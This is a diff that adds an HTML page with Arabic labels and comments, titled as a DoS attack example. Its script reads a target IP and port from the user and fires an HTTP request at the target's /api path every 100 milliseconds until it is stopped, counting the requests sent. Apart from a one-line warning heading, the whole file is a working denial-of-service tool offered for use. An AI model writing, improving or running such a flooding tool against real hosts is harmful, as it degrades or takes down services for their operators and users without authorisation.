@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مثال هجوم DoS</title>
+    <script>
+        let isAttacking = false; // متغير لتتبع حالة الهجوم
+        let attackCount = 0; // عدد الطلبات المرسلة
+
+        function sendRequests() {
+            const target = document.getElementById("targetIP").value; // الحصول على عنوان IP الهدف
+            const port = document.getElementById("targetPort").value; // الحصول على المنفذ
+            if (!target || !port) {
+                alert("يرجى إدخال عنوان IP والـ port الهدف");
+                return;
+            }
+
+            isAttacking = true; // بدء الهجوم
+            attackCount = 0; // إعادة تعيين العداد
+            console.log(`بدء الهجوم على: ${target}:${port}`);
+
+            // إرسال الطلبات بشكل مستمر
+            const intervalId = setInterval(() => {
+                if (!isAttacking) {
+                    clearInterval(intervalId); // إنهاء الهجوم إذا تم التوقف
+                    return;
+                }
+
+                fetch(`http://${target}:${port}/api`) // استبدل بـ API الهدف
+                    .then(response => {
+                        attackCount++; // زيادة العداد
+                        if (!response.ok) {
+                            console.error(`خطأ في الاتصال بـ ${target}:${port}: ${response.status}`);
+                        }
+                    })
+                    .catch(error => {
+                        console.error(`خطأ في الاتصال: ${error}`);
+                    });
+
+                // عرض عدد الطلبات المرسلة
+                document.getElementById("attackCount").innerText = `عدد الطلبات المرسلة: ${attackCount}`;
+            }, 100); // إرسال طلب كل 100 مللي ثانية
+        }
+
+        function stopRequests() {
+            isAttacking = false; // إيقاف الهجوم
+            console.log("تم إيقاف الهجوم");
+            document.getElementById("attackCount").innerText = "تم إيقاف الهجوم";
+        }
+    </script>
+</head>
+<body>
+    <h1>تحذير: هذا قد يؤدي إلى هجوم DoS</h1>
+    <input type="text" id="targetIP" placeholder="أدخل عنوان IP الهدف" />
+    <input type="number" id="targetPort" placeholder="أدخل رقم المنفذ" />
+    <button onclick="sendRequests()">أرسل الطلبات</button>
+    <button onclick="stopRequests()">أوقف الهجوم</button>
+    <p id="attackCount">عدد الطلبات المرسلة: 0</p>
+</body>
+</html>
